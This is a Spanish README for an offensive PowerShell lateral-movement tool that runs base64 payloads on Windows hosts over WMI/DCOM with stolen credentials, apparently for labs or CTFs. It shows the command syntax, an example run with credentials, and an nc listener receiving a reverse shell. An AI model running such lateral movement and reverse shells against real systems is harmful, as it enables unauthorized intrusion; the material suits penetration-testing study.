# Invoke-WinRM.ps1

Este script de PowerShell permite ejecutar comandos de forma remota en sistemas Windows mediante DCOM/CIM (WMI), 
usando credenciales válidas (movimiento lateral). El payload se pasa como un string en Base64, codificado desde PowerShell.

## ⚠️ Uso ético

Este script está diseñado exclusivamente para laboratorios de pruebas, CTFs o entornos controlados con fines educativos o de auditoría. **No debe utilizarse en sistemas sin autorización expresa.**

---

## 💻 Requisitos

- PowerShell 5.0+
- Acceso a la red al objetivo
- Credenciales válidas del usuario destino (hash NTLM)
- Permisos de ejecución WMI/COM

---

## 🔧 Sintaxis

```powershell
Invoke-LM -TargetIP <IP> -Username <usuario> -Password <clave> -PayloadBase64 <payload_base64>
```

📦 Parámetros

Parámetro | Descripción
TargetIP | Dirección IP del objetivo
Username | Nombre de usuario válido en el host destino
Password | Contraseña del usuario
PayloadBase64 | Payload en base64, normalmente un reverse shell

🧪 Ejemplo de uso

```powershell
.\Invoke-WinRM.ps1 -TargetIP \"192.168.109.72\" -Username \"jen\" -Password \"Nexus123!\" -PayloadBase64 $payload64
```

📥 Resultado

```bash
# En Kali
nc -nlvp 443

# Output esperado
connect to [192.168.45.200] from (UNKNOWN) [192.168.109.72] 61414
whoami
corp\\jen
```
